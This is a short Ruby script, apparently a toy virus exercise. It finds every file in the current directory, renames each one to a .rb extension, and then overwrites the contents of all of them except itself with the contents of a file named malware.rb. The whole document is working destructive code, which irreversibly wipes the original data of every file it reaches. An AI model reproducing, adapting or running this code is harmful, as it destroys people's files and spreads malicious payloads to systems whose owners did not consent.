def find_files(files)
    # Search all files and folders in same path with main.rb
    for i in Dir.entries(Dir.pwd) do
        # If element in path is equal to file add this into files array
        if File.file?(i)
            files.append(i)
        end
    end
end

def convert_files_to_ruby(files)
    # Get file in files 
    for file in files do
        # Split file name to get extension and name of the file
        file_name = file.split('.')
        # Rename the original file (change extension of this file to rb)
        File.rename(Dir.pwd + '/%s' % [file] , Dir.pwd + '/%s.rb' % [file_name[0]])
    end

    # Add renamed file into files
    files.clear
    find_files(files)
end

# Inject content of malware.rb to other files
def inject_malware_to_all_ruby_files(files, malware)
    # content of malware
    content = ''

    files.each do |file|
      next if file == __FILE__
  
      begin
        # Get content of malware.rb
        File.open(malware, 'r') do |file_malware|
          content = file_malware.read()
        end

        # Write current file that selected (except: main.rb)
        File.open(file, 'w') do |file_target|
          file_target.write(content)
        end
      rescue
        next
      end
    end
  end  

# Store in 2 different arrays 
files , directories = [] , []
malware = Dir.pwd + '/malware.rb'
find_files(files)
convert_files_to_ruby(files)
inject_malware_to_all_ruby_files(files , malware)
